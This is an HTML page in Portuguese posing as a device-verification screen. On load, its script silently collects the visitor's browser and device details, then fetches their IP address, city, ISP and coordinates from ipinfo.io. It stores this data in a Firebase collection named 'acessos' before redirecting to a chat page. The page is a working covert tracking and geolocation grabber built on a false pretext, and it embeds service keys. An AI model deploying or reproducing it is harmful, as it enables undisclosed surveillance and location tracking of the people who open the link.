<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Verificando...</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      background: linear-gradient(135deg, #1e1e2f, #3a3a5c);
      color: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: 'Segoe UI', Roboto, sans-serif;
    }

    .container {
      text-align: center;
      background-color: rgba(255, 255, 255, 0.05);
      padding: 40px;
      border-radius: 20px;
      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
      backdrop-filter: blur(8px);
      max-width: 90%;
    }

    h2 {
      font-size: 1.8rem;
      margin: 0;
      color: #ffffffcc;
      animation: pulse 2s infinite ease-in-out;
    }

    @keyframes pulse {
      0% { opacity: 0.6; }
      50% { opacity: 1; }
      100% { opacity: 0.6; }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2 id="status">Verificando seu dispositivo...</h2>
  </div>

  <!-- Firebase SDK compat -->
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>

  <script>
    // Firebase config
    const firebaseConfig = {
      apiKey: "AIzaSyCMFKWtiztDvD5BsplbCtPSMnqX0GRt8_A",
      authDomain: "rastreio-104af.firebaseapp.com",
      projectId: "rastreio-104af",
      storageBucket: "rastreio-104af.appspot.com",
      messagingSenderId: "992405931160",
      appId: "1:992405931160:web:e673a6fd95ff0673973ced"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    function detectarDispositivo() {
      const userAgent = navigator.userAgent;
      if (userAgent.includes("iPhone")) {
        if (userAgent.includes("iPhone XR")) return "iPhone XR";
        return "iPhone";
      } else if (userAgent.includes("Android")) {
        return "Android";
      } else if (userAgent.includes("Windows")) {
        return "Windows";
      } else if (userAgent.includes("Macintosh")) {
        return "Mac";
      }
      return "Desconhecido";
    }

    const logBasico = {
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      dispositivo: detectarDispositivo(),
      plataforma: navigator.platform,
      idioma: navigator.language,
      screen: {
        largura: window.screen.width,
        altura: window.screen.height
      }
    };

    // Obtém localização pelo IP com ipinfo.io
    fetch('https://ipinfo.io/json?token=778d905b6237de') // ← insira seu token aqui
      .then(response => response.json())
      .then(data => {
        const localizacao = {
          ip: data.ip,
          cidade: data.city,
          estado: data.region,
          pais: data.country,
          operadora: data.org,
          coordenadas: data.loc // "latitude,longitude"
        };

        const logFinal = { ...logBasico, localizacao };

        db.collection("acessos").add(logFinal)
          .catch(console.error);
      })
      .catch(error => {
        console.error("Erro ao buscar IP info:", error);
        db.collection("acessos").add(logBasico);
      })
     .finally(() => {
  setTimeout(() => {
    document.getElementById("status").innerText = "Redirecionando...";
    window.location.href = "chat.html"; // novo arquivo de chat
  }, 3000);
});

  </script>
</body>
</html>
